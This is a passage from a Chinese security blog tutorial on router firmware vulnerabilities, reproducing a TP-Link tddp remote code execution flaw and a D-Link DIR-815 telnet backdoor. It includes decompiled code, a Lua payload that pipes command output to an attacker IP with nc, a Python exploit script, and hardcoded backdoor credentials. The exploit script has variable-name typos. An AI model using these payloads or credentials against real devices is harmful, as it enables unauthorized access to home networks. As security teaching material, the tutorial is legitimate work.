class="built_in">memset</span>(name, <span class="number">0</span>, <span class="built_in">sizeof</span>(name));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="built_in">luaL_newstate</span>(v1);</span><br><span class="line">  v19 = (<span class="type">char</span> *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v14 = a1 + <span class="number">82</span>;</span><br><span class="line">  v13 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v12 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">83</span>) = <span class="number">49</span>;</span><br><span class="line">  *(_DWORD *)(v12 + <span class="number">4</span>) = <span class="built_in">htonl</span>(<span class="number">0</span>);</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">  v2 = ((<span class="type">unsigned</span> __int8)v13[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v13[<span class="number">8</span>];</span><br><span class="line">  v3 = v12;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">8</span>) = v13[<span class="number">8</span>];</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">9</span>) = <span class="built_in">HIBYTE</span>(v2);</span><br><span class="line">  <span class="keyword">if</span> ( *v13 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">12</span>;</span><br><span class="line">    v14 += <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">28</span>;</span><br><span class="line">    v14 += <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="built_in">sscanf</span>(v19, <span class="string">&quot;%[^;];%s&quot;</span>, s, v10);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] || !v10[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] luaFile or configFile len error.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">555</span>);</span><br><span class="line">LABEL_20:</span><br><span class="line">    *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_13018</span>(<span class="number">-10303</span>, <span class="string">&quot;config set failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="built_in">inet_ntoa</span>(*(<span class="keyword">struct</span> in_addr *)(a1 + <span class="number">4</span>));</span><br><span class="line">  <span class="built_in">sub_91DC</span>(<span class="string">&quot;cd /tmp;tftp -gr %s %s &amp;&quot;</span>, s, v16); <span class="comment">//进入/tmp目录 执行tftp 并从连接TFTP服务器上下载文件</span></span><br><span class="line">  <span class="built_in">sprintf</span>(name, <span class="string">&quot;/tmp/%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( v17 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">access</span>(name, <span class="number">0</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] lua file [%s] don&#x27;t exsit.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">574</span>, name);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">luaL_openlibs</span>(v15);</span><br><span class="line">    v4 = <span class="built_in">luaL_loadfile</span>(v15, name);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v4 = <span class="built_in">lua_pcall</span>(v15, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">lua_getfield</span>(v15, <span class="number">-10002</span>, <span class="string">&quot;config_test&quot;</span>, v4);</span><br><span class="line">    <span class="built_in">lua_pushstring</span>(v15, v10);</span><br><span class="line">    <span class="built_in">lua_pushstring</span>(v15, v16);</span><br><span class="line">    <span class="built_in">lua_call</span>(v15, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    v5 = <span class="built_in">lua_tonumber</span>(v15, <span class="number">-1</span>);</span><br><span class="line">    v18 = <span class="built_in">sub_16EC4</span>(v5, <span class="built_in">HIDWORD</span>(v5));</span><br><span class="line">    <span class="built_in">lua_settop</span>(v15, <span class="number">-2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lua_close</span>(v15);</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复现该漏洞需要TFTP服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install atftpd</span><br></pre></td></tr></table></figure>

<p>并修改&#x2F;etc&#x2F;default&#x2F;atftpd文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE_INETD=false</span><br><span class="line">OPTIONS=&quot;--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure>

<p>创建&#x2F;ftfpboot文件夹，权限777，文件夹下创建payload文件，写入以下，其中10.10.10.1为攻击者IP，137为反弹shell的端口。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;id | nc 10.10.10.1 1337&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>攻击脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,binascii,socket</span><br><span class="line">port_send=<span class="number">1040</span></span><br><span class="line">port_receive=<span class="number">61000</span></span><br><span class="line">tddp_ver=<span class="string">&quot;01&quot;</span></span><br><span class="line">tddp_command=<span class="string">&quot;31&quot;</span></span><br><span class="line">tddp_req=<span class="string">&quot;01&quot;</span></span><br><span class="line">tddp_reply=<span class="string">&quot;00&quot;</span></span><br><span class="line">tdpp_padding=<span class="string">&quot;%0x16X&quot;</span>%<span class="number">00</span></span><br><span class="line">tddp_packet=<span class="string">&quot;&quot;</span>.join([tddp_ver,tddp_command,tddp_req,tddp_reply,tddp_padding])</span><br><span class="line">sock_receive=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">&#x27;&#x27;</span>,port_receive))</span><br><span class="line">socke_send=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">packet=binascii.unhexlify(tddp_packet)</span><br><span class="line">argument=<span class="string">&quot;%s;arbitrary&quot;</span>%sys.argv[<span class="number">2</span>]</span><br><span class="line">packet=packet+argument.encode()</span><br><span class="line">sock_send.sendto(packet,(sys.argv[<span class="number">1</span>],port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line">response,addr=socke_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r=response.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<p>监听1337端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1337</span><br></pre></td></tr></table></figure>

<h3 id="D-Link-DIR-815-后门漏洞"><a href="#D-Link-DIR-815-后门漏洞" class="headerlink" title="D-Link DIR-815 后门漏洞"></a>D-Link DIR-815 后门漏洞</h3><p>固件下载：<a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP">https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP</a></p>
<p>这个直接解压binwalk会报错，得先安装sasquatch并打补丁：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch.git</span><br><span class="line"><span class="built_in">cd</span> sasquatch</span><br><span class="line">wget https://github.com/devttys0/sasquatch/pull/47.patch &amp;&amp; patch -p1 &lt; 47.patch</span><br><span class="line">sudo ./build.sh</span><br></pre></td></tr></table></figure>

<p>然后解压：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ binwalk -Me ./dir815_FW_102.bin</span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-17 04:39:46</span><br><span class="line">Target File:   /home/kali/Desktop/dir815_FW_102.bin</span><br><span class="line">MD5 Checksum:  b2d6476de9b8270255dd6cb6329eb51d</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">&quot;dev=/dev/mtdblock/2&quot;</span></span><br><span class="line">108           0x6C            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3017436 bytes</span><br><span class="line">983148        0xF006C         PackImg section delimiter tag, little endian size: 8399360 bytes; big endian size: 2785280 bytes</span><br><span class="line">...</span><br><span class="line">983180        0xF008C         Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2783169 bytes, 1526 inodes, blocksize: 262144 bytes, created: 2012-01-19 04:03:49</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-17 04:39:47</span><br><span class="line">Target File:   /home/kali/Desktop/_dir815_FW_102.bin.extracted/6C</span><br><span class="line">MD5 Checksum:  e9da4a0f342b4fc9956f725fdb46f640</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1227270       0x12BA06        PGP RSA encrypted session key - keyid: 801000 EA RSA Encrypt-Only 1024b</span><br><span class="line">1227374       0x12BA6E        PGP RSA encrypted session key - keyid: 801000 EA RSA Encrypt-Only 1024b</span><br><span class="line">2096096       0x1FFBE0        MySQL MISAM compressed data file Version 8</span><br><span class="line">2096332       0x1FFCCC        MySQL MISAM compressed data file Version 8</span><br><span class="line">2445344       0x255020        Linux kernel version 2.6.33</span><br><span class="line">2487024       0x25F2F0        CRC32 polynomial table, little endian0</span><br><span class="line">2643904       0x2857C0        Neighborly text, <span class="string">&quot;NeighborSolicitstunnel6 init(): can&#x27;t add protocol&quot;</span></span><br><span class="line">2643924       0x2857D4        Neighborly text, <span class="string">&quot;NeighborAdvertisementst add protocol&quot;</span></span><br><span class="line">2648675       0x286A63        Neighborly text, <span class="string">&quot;neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)&quot;</span></span><br></pre></td></tr></table></figure>

<p>收集文件系统信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/_dir815_FW_102.bin.extracted]</span><br><span class="line">└─$ python3 /home/kali/Tools/trommel/trommel.py -p squashfs-root -o result.json -d ./</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__ __|  _ \   _ \   \  |  \  | ____| |     </span><br><span class="line">   |   |   | |   | |\/ | |\/ | __|   |     </span><br><span class="line">   |   __ &lt;  |   | |   | |   | |     |     </span><br><span class="line">  _|  _| \_\\___/ _|  _|_|  _|_____|_____| </span><br><span class="line">                                           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TROMMEL is working to sift through the directory of files.</span><br><span class="line"></span><br><span class="line">Results will be saved to <span class="string">&#x27;result.json_TROMMEL_20241017_063143&#x27;</span>.</span><br><span class="line"></span><br><span class="line">TROMMEL file hashes will be saved to <span class="string">&#x27;result.json_TROMMEL_Hash_Results_20241017_063143&#x27;</span></span><br><span class="line"></span><br><span class="line">Based on the binary <span class="string">&#x27;busybox&#x27;</span> the instruction <span class="built_in">set</span> architecture is MIPS.</span><br></pre></td></tr></table></figure>

<p>文件result.json_TROMMEL_20241017_063143中内容部分有：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__ __|  _ \   _ \   \  |  \  | ____| |     </span><br><span class="line">   |   |   | |   | |\/ | |\/ | __|   |     </span><br><span class="line">   |   __ &lt;  |   | |   | |   | |     |     </span><br><span class="line">  _|  _| \_\\___/ _|  _|_|  _|_____|_____| </span><br><span class="line">                                           </span><br><span class="line">TROMMEL Results File Name<span class="punctuation">:</span> result.json</span><br><span class="line">Directory<span class="punctuation">:</span> squashfs-root</span><br><span class="line">There are <span class="number">1368</span> total files within the directory.</span><br><span class="line"></span><br><span class="line">Results could be vulnerabilities. These results should be verified as <span class="literal"><span class="keyword">false</span></span> positives may exist.</span><br><span class="line"></span><br><span class="line">Based on the binary &#x27;busybox&#x27; the instruction set architecture is MIPS.</span><br><span class="line">The BusyBox binary found is BusyBox v1<span class="number">.14</span><span class="number">.1</span> <span class="punctuation">[</span>may need to emulate environment<span class="punctuation">]</span></span><br><span class="line">...</span><br><span class="line">Non-Plain Text File<span class="punctuation">,</span> telnet binary file<span class="punctuation">:</span> squashfs-root/etc/init0.d/S80telnetd.sh</span><br><span class="line">Non-Plain Text File<span class="punctuation">,</span> telnetd binary file<span class="punctuation">:</span> squashfs-root/etc/init0.d/S80telnetd.sh</span><br><span class="line">Plain Text File<span class="punctuation">,</span> Keyword<span class="punctuation">:</span> &#x27;telnet&#x27;<span class="punctuation">,</span> File<span class="punctuation">:</span> squashfs-root/etc/init0.d/S80telnetd.sh<span class="punctuation">,</span> Keyword Hits in File<span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>找到&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> [<span class="variable">$0</span>]: <span class="variable">$1</span> ... &gt; /dev/console</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;start&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [ -f <span class="string">&quot;/usr/sbin/login&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		image_sign=`<span class="built_in">cat</span> /etc/config/image_sign`</span><br><span class="line">		telnetd -l /usr/sbin/login -u Alphanetworks:<span class="variable">$image_sign</span> -i br0 &amp;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		telnetd &amp;</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	killall telnetd</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>可以看到image_sign中的数据在telnetd服务中用作Alphanetworks账户的密码，并启动了telnetd服务。继续跟进&#x2F;etc&#x2F;config&#x2F;image_sign文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrgnd08_dlob_dir815</span><br></pre></td></tr></table></figure>

<p>复现时，用账户Alphanetworks和密码wrgnd08_dlob_dir815进行登录Telnet服务，服务端口拿Nmap扫，为23。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://Monoceros.github.io">Monoceros406</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://monoceros.github.io/2024/09/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%90%86%E8%AE%BA%E5%85%A5%E9%97%A8/">http://monoceros.github.io/2024/09/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%90%86%E8%AE%BA%E5%85%A5%E9%97%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Monoceros.github.io" target="_blank">The Blog of Monoceros406</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-Bootkit%E5%88%9D%E6%8E%A2/" title="恶意代码分析-Bootkit初探"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">恶意代码分析-Bootkit初探</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/17/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-Rootkit%E5%88%9D%E6%8E%A2/" title="恶意代码分析-Rootkit初探"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">恶意代码分析-Rootkit初探</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/07/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/" title="固件安全入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="title">固件安全入门</div></div></a></div><div><a href="/2024/10/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E5%AE%9E%E6%88%98%E5%9F%BA%E7%A1%80/" title="硬件安全初探-实战基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-20</div><div class="title">硬件安全初探-实战基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Monoceros406</div><div class="author-info__description">智邮普创工作室安全组（退役）/Nepnep联合战队</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">291</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Monoceros406"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Monoceros406" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:monoceros406@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">QQ:1295625063（不找对象）</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%90%86%E8%AE%BA%E5%85%A5%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">硬件安全初探-理论入门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87"><span class="toc-number">1.1.</span> <span class="toc-text">存储芯片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.2.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">文件系统提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">文件系统分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.5.</span> <span class="toc-text">固件模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU"><span class="toc-number">1.5.1.</span> <span class="toc-text">QEMU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FirmAE"><span class="toc-number">1.5.2.</span> <span class="toc-text">FirmAE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Firmware-Analysis-Toolkit"><span class="toc-number">1.5.3.</span> <span class="toc-text">Firmware Analysis Toolkit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86"><span class="toc-number">1.6.</span> <span class="toc-text">固件解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.7.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sapido-RB-1732-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.1.</span> <span class="toc-text">Sapido RB-1732 路由器命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TP-Link-Smart-Home-Router-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.2.</span> <span class="toc-text">TP-Link Smart Home Router 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Link-DIR-815-%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.3.</span> <span class="toc-text">D-Link DIR-815 后门漏洞</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/09/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Android%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" title="安卓逆向入门-Android后端开发入门">安卓逆向入门-Android后端开发入门</a><time datetime="2024-11-09T05:24:38.000Z" title="发表于 2024-11-09 13:24:38">2024-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/09/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/" title="Linux二进制分析入门">Linux二进制分析入门</a><time datetime="2024-11-09T05:24:04.000Z" title="发表于 2024-11-09 13:24:04">2024-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/28/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-DEX%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%9D%E6%8E%A2/" title="安卓逆向入门-DEX文件格式初探">安卓逆向入门-DEX文件格式初探</a><time datetime="2024-10-28T11:03:36.000Z" title="发表于 2024-10-28 19:03:36">2024-10-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/28/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Unidbg%E5%85%A5%E9%97%A8/" title="安卓逆向入门-Unidbg入门">安卓逆向入门-Unidbg入门</a><time datetime="2024-10-28T11:02:59.000Z" title="发表于 2024-10-28 19:02:59">2024-10-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/28/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Unicorn%E5%85%A5%E9%97%A8/" title="安卓逆向入门-Unicorn入门">安卓逆向入门-Unicorn入门</a><time datetime="2024-10-28T11:02:18.000Z" title="发表于 2024-10-28 19:02:18">2024-10-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Monoceros406</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button 